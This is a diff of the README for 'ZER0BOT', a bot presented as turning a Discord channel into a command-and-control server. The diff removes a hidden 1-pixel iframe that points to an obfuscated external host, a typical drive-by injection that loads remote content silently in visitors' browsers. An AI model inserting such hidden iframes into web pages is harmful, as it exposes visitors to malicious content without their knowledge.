@@ -1,8 +1,8 @@
 # ZER0BOT V2.1 🐐
 
-> <body><i><strong> ZER0 BOT The discord API turns your discord chat channel into a C&C server!
-
+> <body><i><strong> ZER0 BOT The discord API turns your discord chat channel into a C&C server! <BR />
 > You can add or remove methods, tools,...</strong></i></body>
+![zerobotdiscord](https://github.com/R4GN4R0K-SEC/ZER0BOT/assets/74421852/9d381da5-fb6c-4133-8257-120ad57d159a)
 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <HTML>
@@ -2586,7 +2586,6 @@ I have absolutely <B>no</b> idea how this one works.
 </TR>
 
 </TABLE>
-<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
 </body>
 </HTML>
 
